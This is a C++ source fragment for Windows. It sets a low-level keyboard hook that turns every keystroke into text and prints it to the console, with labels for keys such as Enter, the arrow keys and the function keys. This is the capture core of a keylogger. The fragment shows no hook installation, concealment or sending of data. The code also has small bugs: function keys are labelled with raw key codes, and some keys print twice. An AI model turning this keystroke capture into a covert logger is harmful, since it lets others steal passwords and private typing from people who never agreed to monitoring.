#include <windows.h>
#include <iostream>
#include <algorithm>

HHOOK g_keyboardHook = NULL;

unsigned long showFVkCode(unsigned long vkCode) {
	switch (vkCode) {
	case VK_RETURN:
		std::cout << "[ENTER]";
		break;
	case VK_BACK:
		std::cout << "[BACKSPACE]";
		break;
	case VK_TAB:
		std::cout << "[TAB]";
		break;
	case VK_ESCAPE:
		std::cout << "[ESC]";
		break;
	case VK_CAPITAL:
		std::cout << "[CAPS LOCK]";
		break;
	case VK_SPACE:
		std::cout << "[SPACE]";
		break;
	case VK_DELETE:
		std::cout << "[DELETE]";
		break;
	case VK_LEFT:
		std::cout << "[LEFT ARROW]";
		break;
	case VK_RIGHT:
		std::cout << "[RIGHT ARROW]";
		break;
	case VK_UP:
		std::cout << "[UP ARROW]";
		break;
	case VK_DOWN:
		std::cout << "[DOWN ARROW]";
		break;
	case VK_HOME:
		std::cout << "[HOME]";
		break;
	case VK_END:
		std::cout << "[END]";
		break;
	case VK_PRIOR:
		std::cout << "[PAGE UP]";
		break;
	case VK_NEXT:
		std::cout << "[PAGE DOWN]";
		break;
	case VK_INSERT:
		std::cout << "[INSERT]";
		break;
	case VK_F1: case VK_F2: case VK_F3: case VK_F4: case VK_F5: case VK_F6: case VK_F7: case VK_F8: case VK_F9: case VK_F10: case VK_F11: case VK_F12:
		std::cout << "[F" << vkCode << "]";
		break;
	case VK_NUMPAD0: case VK_NUMPAD1: case VK_NUMPAD2: case VK_NUMPAD3: case VK_NUMPAD4: case VK_NUMPAD5: case VK_NUMPAD6: case VK_NUMPAD7: case VK_NUMPAD8: case VK_NUMPAD9:
		std::cout << "[NUMPAD " << (vkCode - VK_NUMPAD0) << "]";
		break;
	case VK_LSHIFT: case VK_RSHIFT:
		std::cout << "[SHIFT]";
		break;
	case VK_LCONTROL: case VK_RCONTROL:
		std::cout << "[CONTROL]";
		break;
	case VK_LMENU: case VK_RMENU:
		std::cout << "[ALT]";
		break;
	case VK_LWIN: case VK_RWIN:
		std::cout << "[WINDOWS]";
		break;
	case VK_PRINT:
		std::cout << "[PRINT SCREEN]";
		break;
	default:
		break;
	}
	return vkCode;
}

LRESULT CALLBACK keyevent(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            unsigned long vkCode = pKbdStruct->vkCode;
            uint8_t keyboardState[256];
            GetKeyboardState(keyboardState);
            if (vkCode != VK_SHIFT && vkCode != VK_CONTROL && vkCode != VK_MENU &&
                vkCode != VK_LWIN && vkCode != VK_RWIN && vkCode != VK_CAPITAL) {
                wchar_t buffer[5];
                int result = ToUnicodeEx(
                    vkCode,
                    pKbdStruct->scanCode,
                    keyboardState,
                    buffer,
                    sizeof(buffer) / sizeof(wchar_t),
                    0,
                    NULL
                );
                if (result > 0) {
                    char charBuffer[5];
                    WideCharToMultiByte(CP_ACP, 0, buffer, result, charBuffer, sizeof(charBuffer), NULL, NULL);
                    charBuffer[result] = '\0';
					auto detect = showFVkCode(vkCode);
					std::cout << charBuffer << std::flush;
                }
            }
        }
    }
    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}
